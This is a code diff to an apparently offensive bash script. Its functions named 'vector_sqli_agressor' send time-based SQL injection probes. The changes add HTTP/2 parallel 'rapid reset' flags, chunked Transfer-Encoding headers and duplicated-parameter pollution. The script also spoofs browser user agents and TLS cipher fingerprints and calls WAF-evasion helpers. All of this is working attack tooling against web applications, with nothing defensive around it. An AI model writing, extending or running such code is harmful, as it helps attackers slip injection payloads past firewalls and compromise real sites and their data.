@@ -139,7 +139,8 @@ vector_sqli_agressor_left() {
        
 local target_cipher=""
         local target_tls13=""
-
+local rapid_reset_args="--http2 --parallel --parallel-max 50"
+        local chunked_headers="-H \"Transfer-Encoding: chunked\" -H \"Content-Type: application/x-www-form-urlencoded\""
         if [[ "$base_ua" == *"Firefox"* ]]; then
            
             random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0 Build/${ua_salt}"
@@ -181,7 +182,12 @@ local t4=$(space2comment_engine "$t2")
 
         local waf_trick=$(braindamage)
         echo -e "\e[0;34m[\e[0m<\e[0;34m]\e[0m Vector 1 [Port:$random_port] Probing Latency on: \e[38;5;236m${target_url}${final_query}\e[0m"
-local curl_output=$(curl $proxy_flag $waf_trick --http2 --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}|%{http_code}" "${target_url}${final_query}")
+curl_output=$(echo -n "${param_name}=999&${param_name}=${param_val}${query_payload}" | \
+            curl $proxy_flag $waf_trick $rapid_reset_args $chunked_headers \
+            --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
+            -m 12 -A "$random_ua" -s -o /dev/null -d @- \
+            -w "%{time_total}|%{http_code}" \
+            "${target_url}${default_path}" "${target_url}${default_path}")
         local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
         local http_status=$(echo "$curl_output" | cut -d'|' -f2)
 
@@ -218,7 +224,8 @@ vector_sqli_agressor_right() {
         local ua_salt=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
         local target_cipher=""
         local target_tls13=""
-
+local rapid_reset_args="--http2 --parallel --parallel-max 50"
+        local chunked_headers="-H \"Transfer-Encoding: chunked\" -H \"Content-Type: application/x-www-form-urlencoded\""
         if [[ "$base_ua" == *"Firefox"* ]]; then
             random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0 Build/${ua_salt}"
             target_cipher="ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305"
@@ -259,8 +266,12 @@ local t4=$(space2comment_engine "$t2")
         
         echo -e "\e[0;34m[\e[0m>\e[0;34m]\e[0m Vector 2 [Port:$random_port] Probing Latency on: \e[38;5;236m${target_url}${final_query}\e[0m"
 
-local curl_output=$(curl $proxy_flag $waf_trick --http2 --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" -m 12 -A "$random_ua" -s -o /dev/null -w "%{time_total}|%{http_code}" "${target_url}${final_query}")
-
+curl_output=$(echo -n "${param_name}=999&${param_name}=${param_val}${query_payload}" | \
+            curl $proxy_flag $waf_trick $rapid_reset_args $chunked_headers \
+            --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
+            -m 12 -A "$random_ua" -s -o /dev/null -d @- \
+            -w "%{time_total}|%{http_code}" \
+            "${target_url}${default_path}" "${target_url}${default_path}")
         local stopwatch=$(echo "$curl_output" | cut -d'|' -f1)
         local http_status=$(echo "$curl_output" | cut -d'|' -f2)
 
